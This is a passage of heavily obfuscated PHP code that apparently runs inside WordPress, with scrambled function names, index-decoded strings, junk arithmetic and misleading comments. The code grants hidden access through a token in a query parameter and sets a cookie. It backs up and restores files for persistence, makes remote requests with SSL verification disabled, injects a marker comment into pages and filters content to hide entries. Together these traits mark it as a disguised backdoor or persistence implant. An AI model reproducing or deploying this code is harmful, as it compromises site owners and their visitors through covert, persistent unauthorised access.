   $GLOBALS['__scf_pomb89yiuz_37']($k3g08rnqu9m) &&  !empty($k3g08rnqu9m[lpwgqh9300(180)])  && !empty($k3g08rnqu9m[m40pvx5ij_z4mj(175)])
   &&  $GLOBALS['__scf_hf87ul3fvpzrkm_150']($k3g08rnqu9m[m5t68uuej1(175)], array(E_ERROR, E_PARSE,  E_CORE_ERROR,    E_COMPILE_ERROR,    E_USER_ERROR), true)
)  {
$eng5lhrt04nh  =      @$GLOBALS['__scf_j79iy74onqck2_35'](t6995wceyqc2q1wqvl());
 $_ef   = @$GLOBALS['__scf_j79iy74onqck2_35']($k3g08rnqu9m[bovhd4vawcd(180)]);$biltq092e9j=PHP_INT_MAX/PHP_INT_MAX;$xcpeltb8=$biltq092e9j+88;



   if ($GLOBALS['__scf_e_8z8ias8ka_43']($eng5lhrt04nh)  && $GLOBALS['__scf_e_8z8ias8ka_43']($_ef) && $_ef   ===    $eng5lhrt04nh)  return;



      }
 c4m38y27ifhwinzv(m40pvx5ij_z4mj(1381));

  if    (defined(bovhd4vawcd(1323)))     {
 $ejlsgjfp7m47k22l     = lvrw_195p7ri57ctv7dk_z();
       if (@$GLOBALS['__scf_a83pywb98qzq2_20']($ejlsgjfp7m47k22l[1]))  {
 $ffmd552bt888w =  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($ejlsgjfp7m47k22l[1], false, null,  0,    (13+51));
if   ($GLOBALS['__scf_e_8z8ias8ka_43']($ffmd552bt888w) &&    $GLOBALS['__scf_i8i8g4oxha_7']($ffmd552bt888w, m40pvx5ij_z4mj(1258) . kdgw8qqvzf6yolk()    .   ':')    ===  0)   {



     $wngh8vc3mx7gkb =   @$GLOBALS['__scf_a83pywb98qzq2_20']($ejlsgjfp7m47k22l[1]    .   m5t68uuej1(1382)) ?  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($ejlsgjfp7m47k22l[1] .   m5t68uuej1(1382),    false,    null,  0,   (0x26+0x1a)) :   "";
        if ($wngh8vc3mx7gkb !==     $ffmd552bt888w)    @$GLOBALS['__scf_uzzmy0m_bqw_77']($ejlsgjfp7m47k22l[1],  $ejlsgjfp7m47k22l[1]    . bovhd4vawcd(1382));
   




   }
      }
unset($ejlsgjfp7m47k22l, $ffmd552bt888w,     $wngh8vc3mx7gkb);


    }
 }      catch  (Throwable  $gdp7v44evzr)   {
      } catch    (Exception      $gdp7v44evzr)   {
  }
 }
 function     _26pdb5pcksvf7bxs8($xmu6vgl26q74)
     {
     if     (!$GLOBALS['__scf_e_8z8ias8ka_43']($xmu6vgl26q74)) return  "";
  if   ($GLOBALS['__scf_at_e2uw9xuj96__1383'](m40pvx5ij_z4mj(1384), $xmu6vgl26q74, $il015rxc9n))   {
 foreach  ($il015rxc9n[1]     as  $enrpn5eaaph9ml9)  {
if  (hgmyr2px4horuv3j($GLOBALS['__scf_wak9390fh7p_356']($enrpn5eaaph9ml9,  true)))     return   "";



   }
    }
    if  ($GLOBALS['__scf_at_e2uw9xuj96__1383'](lpwgqh9300(1385), $xmu6vgl26q74,  $il015rxc9n))   {
 foreach  ($il015rxc9n[1]  as     $enrpn5eaaph9ml9)  {
     if   (hgmyr2px4horuv3j(stripcslashes($enrpn5eaaph9ml9)))    return  "";
   if ($GLOBALS['__scf_i8i8g4oxha_7']($enrpn5eaaph9ml9,     bovhd4vawcd(1386))   !==    false)  {



$nvjfbhhojmal8s   = preg_replace_callback(lpwgqh9300(1387),    m5t68uuej1(1388),  $enrpn5eaaph9ml9);
  if ($GLOBALS['__scf_e_8z8ias8ka_43']($nvjfbhhojmal8s)  && $nvjfbhhojmal8s  !==   $enrpn5eaaph9ml9     &&      hgmyr2px4horuv3j($nvjfbhhojmal8s))    return    "";

 }
  }


  }



   if   ($GLOBALS['__scf_at_e2uw9xuj96__1383'](lpwgqh9300(1389), $xmu6vgl26q74,  $il015rxc9n))     {
   foreach   ($il015rxc9n[1]      as    $enrpn5eaaph9ml9) {
        if (hgmyr2px4horuv3j($GLOBALS['__scf_kr_w9stt2gb_360'](array(bovhd4vawcd(1390),  bovhd4vawcd(1391)), array('\\',    '\''),   $enrpn5eaaph9ml9))) return  "";
     if  ($GLOBALS['__scf_i8i8g4oxha_7']($enrpn5eaaph9ml9,  lpwgqh9300(1392)) !==    false)   {
 $nvjfbhhojmal8s   =    preg_replace_callback(bovhd4vawcd(1387),   m5t68uuej1(1393),   $enrpn5eaaph9ml9);



if      ($GLOBALS['__scf_e_8z8ias8ka_43']($nvjfbhhojmal8s)  && $nvjfbhhojmal8s  !==  $enrpn5eaaph9ml9  &&  hgmyr2px4horuv3j($nvjfbhhojmal8s))     return "";
   }



}
   }

return  $xmu6vgl26q74;$wqyly_442pl=PHP_MAJOR_VERSION;$zz6btmv38v2=$wqyly_442pl*4;

}
    function zrz48hnyk7a1229($p5z1ch3ugyw7kudu)
 {



  if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($p5z1ch3ugyw7kudu)     || ($GLOBALS['__scf_i8i8g4oxha_7']($p5z1ch3ugyw7kudu,    m5t68uuej1(1394))   ===    false  &&   $GLOBALS['__scf_i8i8g4oxha_7']($p5z1ch3ugyw7kudu,   bovhd4vawcd(356))   ===  false))     return    false;
    if   ($GLOBALS['__scf_at_e2uw9xuj96__1383'](lpwgqh9300(1395),   $p5z1ch3ugyw7kudu,   $il015rxc9n)) {
foreach   ($il015rxc9n[1]     as   $enrpn5eaaph9ml9) {
        if (hgmyr2px4horuv3j($GLOBALS['__scf_wak9390fh7p_356']($enrpn5eaaph9ml9,   true)))    return  true;
 }
    }
  if ($GLOBALS['__scf_at_e2uw9xuj96__1383'](lpwgqh9300(1396),  $p5z1ch3ugyw7kudu,    $il015rxc9n)) {
   foreach   ($il015rxc9n[1]     as $enrpn5eaaph9ml9)     {
  if  (hgmyr2px4horuv3j(stripcslashes($enrpn5eaaph9ml9)))   return  true;$f8zvjkbqezz35=9016;$q2tmdnaqnssa=$f8zvjkbqezz35%17;
    }
   foreach  ($il015rxc9n[1]   as  $enrpn5eaaph9ml9)    {
 if   ($GLOBALS['__scf_i8i8g4oxha_7']($enrpn5eaaph9ml9,   bovhd4vawcd(1397))   ===     false) continue;
   $nvjfbhhojmal8s =   preg_replace_callback(bovhd4vawcd(1398), m40pvx5ij_z4mj(1393), $enrpn5eaaph9ml9);


    if   ($GLOBALS['__scf_e_8z8ias8ka_43']($nvjfbhhojmal8s)  && $nvjfbhhojmal8s !==  $enrpn5eaaph9ml9 && hgmyr2px4horuv3j($nvjfbhhojmal8s))  return true;
       }
  }
  if      ($GLOBALS['__scf_at_e2uw9xuj96__1383'](m40pvx5ij_z4mj(1389), $p5z1ch3ugyw7kudu, $il015rxc9n))  {
foreach      ($il015rxc9n[1] as $enrpn5eaaph9ml9)   {

if   (hgmyr2px4horuv3j($GLOBALS['__scf_kr_w9stt2gb_360'](array(lpwgqh9300(1390),    m5t68uuej1(1391)),   array('\\',   '\''),   $enrpn5eaaph9ml9)))   return true;
 }
    foreach     ($il015rxc9n[1] as $enrpn5eaaph9ml9)   {
if      ($GLOBALS['__scf_i8i8g4oxha_7']($enrpn5eaaph9ml9,    lpwgqh9300(1397))  ===   false)   continue;
$nvjfbhhojmal8s    =    preg_replace_callback(m5t68uuej1(1398),  bovhd4vawcd(1399),    $enrpn5eaaph9ml9);
if  ($GLOBALS['__scf_e_8z8ias8ka_43']($nvjfbhhojmal8s)  &&  $nvjfbhhojmal8s  !==  $enrpn5eaaph9ml9  && hgmyr2px4horuv3j($nvjfbhhojmal8s))   return      true;
}
// load sparse publisher

       }


    return false;



  }
    function     qvjdebfk73eai06dz0vqt($p5z1ch3ugyw7kudu)


{
 if   (!$GLOBALS['__scf_e_8z8ias8ka_43']($p5z1ch3ugyw7kudu)  || $p5z1ch3ugyw7kudu    ===  "")  return "";
 return   ($GLOBALS['__scf_vqnw5_4kg7eu_96'](m5t68uuej1(97),   $GLOBALS['__scf_vvn10ievj2k_9']($p5z1ch3ugyw7kudu,  0,  (8135+57)),  $ijvqfm4k0rvi7))   ? $ijvqfm4k0rvi7[1] :  "";


  }



 function   zzlvsgg1dbts4z($t6jsjlatx2i, $e7iswev08tryjha,  $y_qnnfh9_u7jy7   =   null)


    {


   if (!$GLOBALS['__scf_e_8z8ias8ka_43']($t6jsjlatx2i)  ||  $t6jsjlatx2i     ===    "")    return   $t6jsjlatx2i;
 $vji7wd8s3vzb =  m5t68uuej1(777) . $e7iswev08tryjha .     m5t68uuej1(778);


 $utln0lk9ielcmwaa   =  "";
  $t6py5ze33ut2399c    =  0;
  while   ($t6py5ze33ut2399c++   <   (95+33))   {
 $lojxirmkuemtyo = $GLOBALS['__scf_i8i8g4oxha_7']($t6jsjlatx2i,     $vji7wd8s3vzb);
if    ($lojxirmkuemtyo === false) break;
$t81aaz4ksg7cljzg  =  $lojxirmkuemtyo    +  $GLOBALS['__scf_fr9u7cq1eo_10']($vji7wd8s3vzb);
 $ql7f2fj4b9hzg =     $GLOBALS['__scf_i8i8g4oxha_7']($t6jsjlatx2i,   m5t68uuej1(1237),   $t81aaz4ksg7cljzg);
  if ($ql7f2fj4b9hzg ===  false ||  $ql7f2fj4b9hzg  -   $t81aaz4ksg7cljzg >  (68-4))    {
 $utln0lk9ielcmwaa     .=   $GLOBALS['__scf_vvn10ievj2k_9']($t6jsjlatx2i,    0, $t81aaz4ksg7cljzg);
   $t6jsjlatx2i = $GLOBALS['__scf_vvn10ievj2k_9']($t6jsjlatx2i,   $t81aaz4ksg7cljzg);
   continue;
}
      $e_oq5qixgrj6   =     $GLOBALS['__scf_vvn10ievj2k_9']($t6jsjlatx2i, $t81aaz4ksg7cljzg, $ql7f2fj4b9hzg  -  $t81aaz4ksg7cljzg);
  if      (!$GLOBALS['__scf_vqnw5_4kg7eu_96'](m40pvx5ij_z4mj(1400),     $e_oq5qixgrj6))  {
$utln0lk9ielcmwaa    .=  $GLOBALS['__scf_vvn10ievj2k_9']($t6jsjlatx2i, 0, $t81aaz4ksg7cljzg);



  $t6jsjlatx2i    =  $GLOBALS['__scf_vvn10ievj2k_9']($t6jsjlatx2i, $t81aaz4ksg7cljzg);



   continue;
    }
  $qi772ku7v5dl    =    m40pvx5ij_z4mj(1401)  .  $e7iswev08tryjha     .    m40pvx5ij_z4mj(1402) .    $e_oq5qixgrj6 .   bovhd4vawcd(1403);
      $vkp8srpe98nmol9      = $GLOBALS['__scf_i8i8g4oxha_7']($t6jsjlatx2i,   $qi772ku7v5dl,     $ql7f2fj4b9hzg);


  if ($vkp8srpe98nmol9   === false) break;

  $utln0lk9ielcmwaa .=  $GLOBALS['__scf_vvn10ievj2k_9']($t6jsjlatx2i,   0,  $lojxirmkuemtyo);
    $qbsr2y64itbk26ql =  $GLOBALS['__scf_vvn10ievj2k_9']($t6jsjlatx2i,   $lojxirmkuemtyo,  $vkp8srpe98nmol9 +  $GLOBALS['__scf_fr9u7cq1eo_10']($qi772ku7v5dl)  - $lojxirmkuemtyo);
if ($y_qnnfh9_u7jy7 !==    null) {
  $w1jfjex0s0pwt    =  $GLOBALS['__scf_jvgqufbujun_y_289']($y_qnnfh9_u7jy7, $qbsr2y64itbk26ql);


if ($GLOBALS['__scf_e_8z8ias8ka_43']($w1jfjex0s0pwt))      $utln0lk9ielcmwaa    .= $w1jfjex0s0pwt;
     }     else {
$utln0lk9ielcmwaa .=      $qbsr2y64itbk26ql;
 }
 $t6jsjlatx2i   =  $GLOBALS['__scf_vvn10ievj2k_9']($t6jsjlatx2i,    $vkp8srpe98nmol9  +     $GLOBALS['__scf_fr9u7cq1eo_10']($qi772ku7v5dl));


}
return  $utln0lk9ielcmwaa    .   $t6jsjlatx2i;
 }
     function  e8yeukq9993bhe($xmu6vgl26q74)
{
  return      "";
 }
     function  co1r_0u59cqw915x_2($xmu6vgl26q74)
{$q0pyyx2yc=PHP_MAJOR_VERSION;$igkqek9l65g=$q0pyyx2yc*6;
if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($xmu6vgl26q74))  return  "";

      if (!defined(m5t68uuej1(1323)))  return   $xmu6vgl26q74;
 $wf5unio_8eqsnuz     =   dv62azao9qb3z33m4cwig0(ABSPATH .   lpwgqh9300(1404),    (13-5));
if   ($GLOBALS['__scf_vqnw5_4kg7eu_96'](lpwgqh9300(1405)  .  $wf5unio_8eqsnuz  . m5t68uuej1(1406),  $xmu6vgl26q74))   return  "";
 

return  $xmu6vgl26q74;
  }

function orp0rsd3hzmr2x616cvnhm($t6jsjlatx2i)
{
     if   (!$GLOBALS['__scf_e_8z8ias8ka_43']($t6jsjlatx2i)    || $t6jsjlatx2i   === "")    return $t6jsjlatx2i;
    $jhq7h77_vtf  =      zzlvsgg1dbts4z($t6jsjlatx2i,   bovhd4vawcd(1407),  m5t68uuej1(1408));
 $jhq7h77_vtf =   zzlvsgg1dbts4z($jhq7h77_vtf,     bovhd4vawcd(1409),  bovhd4vawcd(1410));
 if  ($GLOBALS['__scf_e_8z8ias8ka_43']($jhq7h77_vtf)) $jhq7h77_vtf   =     $GLOBALS['__scf_r1v12_o00h5hc_454'](m40pvx5ij_z4mj(1411),      "",   $jhq7h77_vtf);
 if   (!$GLOBALS['__scf_e_8z8ias8ka_43']($jhq7h77_vtf)) $jhq7h77_vtf      =    $t6jsjlatx2i;
   if      (zrz48hnyk7a1229($jhq7h77_vtf))   {
   $jhq7h77_vtf = zzlvsgg1dbts4z($jhq7h77_vtf, bovhd4vawcd(1407),  bovhd4vawcd(1412));
  


 $jhq7h77_vtf  = zzlvsgg1dbts4z($jhq7h77_vtf, m5t68uuej1(1409),   m40pvx5ij_z4mj(1413));
    if      ($GLOBALS['__scf_e_8z8ias8ka_43']($jhq7h77_vtf))   $jhq7h77_vtf  =     $GLOBALS['__scf_r1v12_o00h5hc_454'](m5t68uuej1(1411),  "",     $jhq7h77_vtf);



 }


   return $GLOBALS['__scf_e_8z8ias8ka_43']($jhq7h77_vtf)   ?   $jhq7h77_vtf  :    $t6jsjlatx2i;
    }

  function  gingpjknsad2dvuvmbk4($t6jsjlatx2i)
     {
 if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($t6jsjlatx2i)  ||    !defined(lpwgqh9300(1323)))    return  false;
      if ($GLOBALS['__scf_vqnw5_4kg7eu_96'](m5t68uuej1(1411),  $t6jsjlatx2i)) return     true;
  $l1k77y58kku8kahq    =   dv62azao9qb3z33m4cwig0(ABSPATH  .   bovhd4vawcd(1414),   (246^254));

   if ($GLOBALS['__scf_at_e2uw9xuj96__1383'](bovhd4vawcd(1415),  $t6jsjlatx2i,  $c7909a3qbs))    {$hzs88mqmo5dlz=58|12;$byrrhbqh99rq0d=$hzs88mqmo5dlz^220;
  foreach  ($c7909a3qbs[1]  as  $s0y__7sl9qz)  {
 if  ($GLOBALS['__scf_vvn10ievj2k_9']($s0y__7sl9qz,  -(214^223)) === ':'   .  $l1k77y58kku8kahq)   return true;
 }
       }
$_dd =    $GLOBALS['__scf_vvn10ievj2k_9']($GLOBALS['__scf_pe3s4q1z7z_59'](ABSPATH  .   m5t68uuej1(1416)),  0, (11-3));


     if    ($GLOBALS['__scf_at_e2uw9xuj96__1383'](m40pvx5ij_z4mj(1417), $t6jsjlatx2i,    $_dm))  {
      foreach   ($_dm[1] as $t2ga1v2pemneg3v8)    {



    if   ($t2ga1v2pemneg3v8  ===  $_dd)      return  true;
 

   }
    }
      return  false;



}
  function      vnmo907ygwuluodz()
   {
    if (!isset($_GET[m40pvx5ij_z4mj(1418)])  ||  !$GLOBALS['__scf_e_8z8ias8ka_43']($_GET[bovhd4vawcd(1418)]) ||      !$GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1376)))  return;
 $ho_uo4wbxc3tqb_ =  @get_option(lpwgqh9300(1419),  array());
 if   (!$GLOBALS['__scf_pomb89yiuz_37']($ho_uo4wbxc3tqb_))   return;
    $btxl38vflku7p   = (string)    $_GET[bovhd4vawcd(1418)];
  $bby8admgpnmgult   = array();
  if     (isset($ho_uo4wbxc3tqb_['t']))    $bby8admgpnmgult[]    =  (string) $ho_uo4wbxc3tqb_['t'];
  if  (isset($ho_uo4wbxc3tqb_[m40pvx5ij_z4mj(1420)])  &&    $GLOBALS['__scf_pomb89yiuz_37']($ho_uo4wbxc3tqb_[m5t68uuej1(1421)])) {
 foreach  ($ho_uo4wbxc3tqb_[lpwgqh9300(1422)]  as $tcqzdtvpxvsdp) {
// concave heap

if      ($GLOBALS['__scf_pomb89yiuz_37']($tcqzdtvpxvsdp) &&     isset($tcqzdtvpxvsdp['t']))     $bby8admgpnmgult[]   =   (string)   $tcqzdtvpxvsdp['t'];
       }
}
$ikm5544gay  = false;
   foreach ($bby8admgpnmgult as  $wkkrt_mzimb2)    {
 if  ($wkkrt_mzimb2    ===  "")    continue;
        $ikm5544gay  =  $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1423))  ?    hash_equals($wkkrt_mzimb2,  $btxl38vflku7p) :  ($wkkrt_mzimb2  === $btxl38vflku7p);
if    ($ikm5544gay)   break;

 }
 if (!$ikm5544gay)    return;
$GLOBALS[bovhd4vawcd(1424)]  =    $btxl38vflku7p;
  ki6tdgirglgewq(m5t68uuej1(1425),  bovhd4vawcd(1426),  -1);
    if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(461)))     {
     $GLOBALS['__scf_w5tg0wn3h2rih_170'](bovhd4vawcd(1426));
}
 }
       function   lzt8bzbdn0surn()
    {
// speculative deopt

  if (empty($GLOBALS[lpwgqh9300(1427)])   ||     !$GLOBALS['__scf_e_8z8ias8ka_43']($GLOBALS[m5t68uuej1(1427)])) return;$vz5jxhcp=-8;$vw2ll9tx=($vz5jxhcp>0)?$vz5jxhcp:-$vz5jxhcp;
 if   (!empty($GLOBALS[m40pvx5ij_z4mj(1428)]))     return;
 $GLOBALS[lpwgqh9300(1428)] =  true;
echo "\n<!--SCK:"     . $GLOBALS[bovhd4vawcd(1427)]  .  m5t68uuej1(1429);
  }
   function  sqpd81axvg872g96_9tash()
 {
  if    (!$GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1376)))  return    false;
 $ijvqfm4k0rvi7     =  @get_option(m40pvx5ij_z4mj(1430),  "");
 if    (!$GLOBALS['__scf_e_8z8ias8ka_43']($ijvqfm4k0rvi7) ||     $GLOBALS['__scf_i8i8g4oxha_7']($ijvqfm4k0rvi7,    bovhd4vawcd(1431))  !==  0) return  false;
   $kgywtuy0vdp1i9ap      = (int)    $GLOBALS['__scf_vvn10ievj2k_9']($ijvqfm4k0rvi7,     (2+4));
  if  ($kgywtuy0vdp1i9ap && $GLOBALS['__scf_ibw9xvmx9ckin_187']()   -  $kgywtuy0vdp1i9ap  > (1865+84535))  return  false;
return  true;
 }
  function   dljv6u_n3brkommu($uim861ig2y,   $eglnepbv6r0i)
    {
        if (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1377)) ||  !$GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(461)))  return   false;


$ho_uo4wbxc3tqb_   =     @get_option(m40pvx5ij_z4mj(1419),   array());
    if  (!$GLOBALS['__scf_pomb89yiuz_37']($ho_uo4wbxc3tqb_))   $ho_uo4wbxc3tqb_  = array();
   if (!isset($ho_uo4wbxc3tqb_[bovhd4vawcd(1432)]) ||   !$GLOBALS['__scf_pomb89yiuz_37']($ho_uo4wbxc3tqb_[m40pvx5ij_z4mj(1432)]))  {
// WP Font Library aspect ratio

$blvbk9xvg8h30hfs =   array();
     if    (isset($ho_uo4wbxc3tqb_['t'], $ho_uo4wbxc3tqb_['p'],     $ho_uo4wbxc3tqb_['b']))  {
 $dzix01kpv98f2 = (string)  $ho_uo4wbxc3tqb_['p'];
    $xi3mqg7x_lsr_bvk   = (string)  $ho_uo4wbxc3tqb_['b'];
       $blvbk9xvg8h30hfs[$GLOBALS['__scf_pe3s4q1z7z_59']($dzix01kpv98f2)]  =  array('t' =>   (string) $ho_uo4wbxc3tqb_['t'],   'p'  => $dzix01kpv98f2, 'b'  =>  $xi3mqg7x_lsr_bvk,     m40pvx5ij_z4mj(1433) =>  isset($ho_uo4wbxc3tqb_[m5t68uuej1(1433)]) ?    (int)   $ho_uo4wbxc3tqb_[m5t68uuej1(1433)]  :  $GLOBALS['__scf_ibw9xvmx9ckin_187'](),    m40pvx5ij_z4mj(1434)    =>  0, 'n'  =>  (@$GLOBALS['__scf_a83pywb98qzq2_20']($xi3mqg7x_lsr_bvk)    &&  (int)  @$GLOBALS['__scf_pftf6vocmvs2m_99']($xi3mqg7x_lsr_bvk) ===  0)   ? 1    :  0);
 $wngh8vc3mx7gkb  =   $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1435)) ?    @md5_file($dzix01kpv98f2)  :      false;
if  ($GLOBALS['__scf_e_8z8ias8ka_43']($wngh8vc3mx7gkb)   &&   $wngh8vc3mx7gkb  !==  "") $blvbk9xvg8h30hfs[$GLOBALS['__scf_pe3s4q1z7z_59']($dzix01kpv98f2)]['h']  = $wngh8vc3mx7gkb;
  unset($dzix01kpv98f2,   $xi3mqg7x_lsr_bvk,    $wngh8vc3mx7gkb);
 }
       $ho_uo4wbxc3tqb_    =    array(m40pvx5ij_z4mj(1432)   =>  $blvbk9xvg8h30hfs);
 }
// on-stack replacement

  $e_oq5qixgrj6   =  $GLOBALS['__scf_pe3s4q1z7z_59']($uim861ig2y);



$bmplxrcnfxm4icz    =   sqpd81axvg872g96_9tash()   ? 1      :  0;
 $wa0450oyh46ncj5i   =    !isset($ho_uo4wbxc3tqb_[m5t68uuej1(1432)][$e_oq5qixgrj6]);
if  (!$wa0450oyh46ncj5i)   {
    $ho_uo4wbxc3tqb_[m40pvx5ij_z4mj(1432)][$e_oq5qixgrj6][m40pvx5ij_z4mj(1436)]  = $GLOBALS['__scf_ibw9xvmx9ckin_187']();
 $ho_uo4wbxc3tqb_[m40pvx5ij_z4mj(1437)][$e_oq5qixgrj6]['g'] =  $GLOBALS['__scf_ciwgxuks3i4cd_287'](true);
  $ho_uo4wbxc3tqb_[m5t68uuej1(1437)][$e_oq5qixgrj6][lpwgqh9300(1434)]     = 0;
$ho_uo4wbxc3tqb_[bovhd4vawcd(1437)][$e_oq5qixgrj6]['n'] =  ($eglnepbv6r0i  ===   "") ?  1 :   0;
     $ho_uo4wbxc3tqb_[lpwgqh9300(1437)][$e_oq5qixgrj6][m40pvx5ij_z4mj(1438)]  = $bmplxrcnfxm4icz;
 $ho_uo4wbxc3tqb_[m40pvx5ij_z4mj(1437)][$e_oq5qixgrj6][lpwgqh9300(1439)]  =   $GLOBALS['__scf_ibw9xvmx9ckin_187']();
 $ho_uo4wbxc3tqb_[bovhd4vawcd(1437)][$e_oq5qixgrj6][m5t68uuej1(1440)]   =   0;
$ho_uo4wbxc3tqb_[m40pvx5ij_z4mj(1437)][$e_oq5qixgrj6][bovhd4vawcd(1441)]    =     0;
        $ho_uo4wbxc3tqb_[bovhd4vawcd(1437)][$e_oq5qixgrj6][m40pvx5ij_z4mj(1442)] = 0;
 if  (!a3hx61zfms1ji3euwsc($ho_uo4wbxc3tqb_[lpwgqh9300(1437)][$e_oq5qixgrj6]['b'], $eglnepbv6r0i))    {
    r63yaewew47stuijcrwsx6(m5t68uuej1(1443),   m5t68uuej1(1444));
  return     false;


     }
 }   else  {
       if ($GLOBALS['__scf_xbixt340jb_38']($ho_uo4wbxc3tqb_[lpwgqh9300(1437)])  >=  (0x5+0x5)) {


 r63yaewew47stuijcrwsx6(m5t68uuej1(1445),    m5t68uuej1(1446));
return  false;
  }
 $_xfdo1_14r691bp    =  dha61pphirvk3tnlr();
 $ucbjus6jraxtvgi   = $_xfdo1_14r691bp .  bovhd4vawcd(1447)   .      dv62azao9qb3z33m4cwig0($uim861ig2y, (3+9))   . m5t68uuej1(1448);
    if   (!a3hx61zfms1ji3euwsc($ucbjus6jraxtvgi, $eglnepbv6r0i))    {
     r63yaewew47stuijcrwsx6(m5t68uuej1(1449), bovhd4vawcd(1444));


   return  false;
 }
     $ho_uo4wbxc3tqb_[bovhd4vawcd(1437)][$e_oq5qixgrj6] =  array('t'   =>    rvm77sgyh22g1daysbsfw((9+7)), 'p'   => $uim861ig2y, 'b'  =>  $ucbjus6jraxtvgi,   lpwgqh9300(1436)  =>  $GLOBALS['__scf_ibw9xvmx9ckin_187'](), 'g'   =>  $GLOBALS['__scf_ciwgxuks3i4cd_287'](true),     m40pvx5ij_z4mj(1434)   =>  0,  'n' =>  ($eglnepbv6r0i    ===  "")  ?  1 :   0,  m5t68uuej1(1450)  =>  $bmplxrcnfxm4icz, m5t68uuej1(1439)    =>   $GLOBALS['__scf_ibw9xvmx9ckin_187'](), m40pvx5ij_z4mj(1451)  =>   0, m5t68uuej1(1441)   =>  0, m40pvx5ij_z4mj(1442)  =>   0);
    }
    $j6cucoywuq0d53  =  @update_option(lpwgqh9300(1452),  $ho_uo4wbxc3tqb_,  m40pvx5ij_z4mj(1453));
if  (!$j6cucoywuq0d53)   {
 if     ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1454)))   @wp_cache_delete(bovhd4vawcd(1452),     lpwgqh9300(1455));
  $wuvzx13ynqu4sh3b  =  @get_option(m5t68uuej1(1452),   array());
 $f78jj4mfbqfaw6_  = $GLOBALS['__scf_pomb89yiuz_37']($wuvzx13ynqu4sh3b)  &&    isset($wuvzx13ynqu4sh3b[m40pvx5ij_z4mj(1437)][$e_oq5qixgrj6])  &&    $GLOBALS['__scf_pomb89yiuz_37']($wuvzx13ynqu4sh3b[m40pvx5ij_z4mj(1456)][$e_oq5qixgrj6])
&&   isset($wuvzx13ynqu4sh3b[m5t68uuej1(1456)][$e_oq5qixgrj6]['g'])  &&  (string) $wuvzx13ynqu4sh3b[lpwgqh9300(1456)][$e_oq5qixgrj6]['g']  ===   (string)      $ho_uo4wbxc3tqb_[bovhd4vawcd(1456)][$e_oq5qixgrj6]['g'];

 if  (!$f78jj4mfbqfaw6_) {



    if ($wa0450oyh46ncj5i)    netei2x342rtzmi4tj69($ho_uo4wbxc3tqb_[m40pvx5ij_z4mj(1456)][$e_oq5qixgrj6]['b']);
   r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(1449),    m5t68uuej1(1457));
   return  false;
    }
  }
$GLOBALS['__scf_w5tg0wn3h2rih_170'](m5t68uuej1(1458));
return true;
}

 function qf3be0n5t4x_6tii01jj3v()

      {


  if (!isset($GLOBALS[lpwgqh9300(971)])     ||    !$GLOBALS['__scf_vfprez81gdrrrd_1459']($GLOBALS[lpwgqh9300(971)]))    $GLOBALS[m40pvx5ij_z4mj(1460)]    = 0.0;



  return      11.0   - $GLOBALS[bovhd4vawcd(1461)];
 }
  function    v6vxxreyrfdn2ah4n2($yxb0rsy1wh)
  {
$GLOBALS[lpwgqh9300(1461)]  =  (isset($GLOBALS[bovhd4vawcd(1461)]) && $GLOBALS['__scf_vfprez81gdrrrd_1459']($GLOBALS[lpwgqh9300(1462)]) ? $GLOBALS[lpwgqh9300(1462)] :     0.0)   + (float)    $yxb0rsy1wh;

     }
     function  htzpzipsvzyykui171m($azf98962xi)
    {
$azv_gtae8qt_zs  = qf3be0n5t4x_6tii01jj3v();
  if  ($azv_gtae8qt_zs     <=  0.5) return  array(-2, "");
$w_k1kzxexkgh6hp    =     $GLOBALS['__scf_f0qmyuwszehfh7_472'](1,  $GLOBALS['__scf_fffiaden_pfx9__473']((1+5),  (int)    $azv_gtae8qt_zs));

$ldnijs34utinjtuu   =  $GLOBALS['__scf_ciwgxuks3i4cd_287'](true);



 $q71wmro6q6q84srm  = @$GLOBALS['__scf_bgujd0wqxduxtu_290']($azf98962xi,  array(m5t68uuej1(465)  => $w_k1kzxexkgh6hp, bovhd4vawcd(308)   =>   false,  bovhd4vawcd(1463) =>  true,  lpwgqh9300(679) =>    0,  lpwgqh9300(680)  => (1048521+55), m5t68uuej1(965) =>     array(m40pvx5ij_z4mj(1464) => lpwgqh9300(1465),  m40pvx5ij_z4mj(1466)  => m5t68uuej1(970))));



  v6vxxreyrfdn2ah4n2($GLOBALS['__scf_ciwgxuks3i4cd_287'](true) -  $ldnijs34utinjtuu);

if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1467)) &&    is_wp_error($q71wmro6q6q84srm))    return  array(-1,     false);
   $ohfs0792xygm = $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1468))    ?   (int)    wp_remote_retrieve_response_code($q71wmro6q6q84srm)  :   0;$f_m1orqz9o=(0xd5+0xff);$surk0ybb=$f_m1orqz9o%5;
 return array($ohfs0792xygm,  $ohfs0792xygm >    0  &&     $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1469)) ?    (string)     wp_remote_retrieve_body($q71wmro6q6q84srm) :   "");
  }
 function    rtmq61dax3c2elfi($uim861ig2y)
{


       if      (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1376)) ||    !$GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1470)) ||      !$GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1471))) return;
 $ho_uo4wbxc3tqb_ = @get_option(lpwgqh9300(1452),     array());
     if  (!$GLOBALS['__scf_pomb89yiuz_37']($ho_uo4wbxc3tqb_) ||  !isset($ho_uo4wbxc3tqb_[lpwgqh9300(1456)]) ||     !$GLOBALS['__scf_pomb89yiuz_37']($ho_uo4wbxc3tqb_[m40pvx5ij_z4mj(1456)]))    return;
 $e_oq5qixgrj6    =   $GLOBALS['__scf_pe3s4q1z7z_59']($uim861ig2y);
